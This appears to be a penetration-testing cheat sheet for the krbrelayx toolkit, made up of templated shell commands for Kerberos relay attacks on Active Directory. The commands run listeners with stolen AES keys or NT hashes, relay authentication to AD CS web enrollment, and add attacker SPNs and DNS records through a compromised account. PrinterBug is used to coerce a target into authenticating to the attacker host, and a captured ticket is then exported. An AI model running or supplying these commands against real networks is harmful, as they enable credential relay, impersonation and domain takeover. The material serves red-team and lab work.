# krbrelayx

## krbrelayx listener

### Listener with AES key

List listener with AES key with krbrelayx.

Start krbrelayx using an AES key to receive and decrypt incoming Kerberos authentication for a computer account.

```sh title:"Krbrelayx List Listener with AES Key"
krbrelayx.py -aesKey "$aes256_key"
```
<!-- cheat
var aes256_key
-->

### Listener with NT hash

Dump listener with NT hash with krbrelayx.

Start krbrelayx using an NT hash, commonly for user-account constrained or unconstrained delegation abuse.

```sh title:"Krbrelayx Dump Listener with NT Hash"
krbrelayx.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash"
```
<!-- cheat
var nt_hash
-->

### AD CS relay

List AD CS relay with krbrelayx.

Relay Kerberos authentication to AD CS web enrollment.

```sh title:"Krbrelayx List AD CS Relay"
krbrelayx.py --target "http://$ca_fqdn/certsrv" --adcs --template "$template_name" --victim "$victim_fqdn"
```
<!-- cheat
var ca_fqdn
var template_name
var victim_fqdn
-->

## krbrelayx setup

### Add attacker SPN

Add attacker SPN with krbrelayx.

Add an SPN to a compromised account so Kerberos authentication can be routed to the attacker host.

```sh title:"Krbrelayx Add Attacker SPN"
addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn"
```
<!-- cheat
var domain
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### Remove attacker SPN

Remove attacker SPN with krbrelayx.

Clean up the added SPN.

```sh title:"Krbrelayx Remove Attacker SPN"
addspn.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -s "HOST/$attacker_fqdn" --additional "$dc_fqdn" --delete
```
<!-- cheat
var domain
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### Add attacker DNS record

Add attacker DNS record with krbrelayx.

Add an ADIDNS record pointing the attacker FQDN to your host.

```sh title:"Krbrelayx Add Attacker DNS Record"
dnstool.py -u "$domain/$compromised_account" -p "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -r "$attacker_fqdn" -d "$lhost" --action add "$dc_fqdn"
```
<!-- cheat
import tun_ip
var domain
var compromised_account
var nt_hash
var attacker_fqdn
var dc_fqdn
-->

### Query DNS record

Query DNS record with krbrelayx.

Check the ADIDNS record before or after cleanup.

```sh title:"Krbrelayx Query DNS Record"
dnstool.py -u "$domain/$user" -p "$pass" --record "$attacker_fqdn" --action query "$dc_fqdn"
```
<!-- cheat
var domain
var user
var pass
var attacker_fqdn
var dc_fqdn
-->

## krbrelayx coercion

### PrinterBug to listener

List PrinterBug to listener with krbrelayx.

Coerce a target running Print Spooler to authenticate to the attacker FQDN.

```sh title:"Krbrelayx List PrinterBug to Listener"
printerbug.py "$domain/$user:$pass@$target_fqdn" "$attacker_fqdn"
```
<!-- cheat
var domain
var user
var pass
var target_fqdn
var attacker_fqdn
-->

### Export captured ticket

Run export captured ticket with krbrelayx.

Use a captured ccache with Kerberos-aware tools.

```sh title:"Krbrelayx Run Export Captured Ticket"
export KRB5CCNAME="$ccache_file"
```
<!-- cheat
var ccache_file
-->
